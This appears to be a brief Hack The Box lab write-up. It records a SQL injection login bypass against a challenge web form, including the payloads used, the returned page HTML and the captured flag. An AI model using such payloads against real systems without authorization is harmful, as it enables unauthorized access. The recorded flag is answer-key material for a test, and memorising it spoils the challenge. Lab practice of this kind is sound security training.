# HTB Challenge - SQL Injection Investigation

## Target Information
- **IP Address:** 10.129.96.106
- **Hostname (Likely):** Epsilon
- **Category:** Web / Cloud
- **Vulnerability:** SQL Injection (Login Bypass)

## Investigation Steps
1. **Network Connectivity:** Initially had issues reaching 10.129.96.99. Switched focus to 10.129.96.106 after user confirmed VPN fix.
2. **Web Enumeration:** Found a login form at `http://10.129.96.106`.
   - Parameters: `username`, `password`
3. **Exploitation:**
   - Payload: `admin'-- -` (or `admin' or 1=1-- `)
   - Result: Successful login bypass.
   - Page Content:
     ```html
     <div><h3>Congratulations!</h3><br><h4>Your flag is: e3d0796d002a446c0e622226f42e9672</h4></div>
     ```

## Findings
- **First Word on Page:** Congratulations
- **Flag:** e3d0796d002a446c0e622226f42e9672
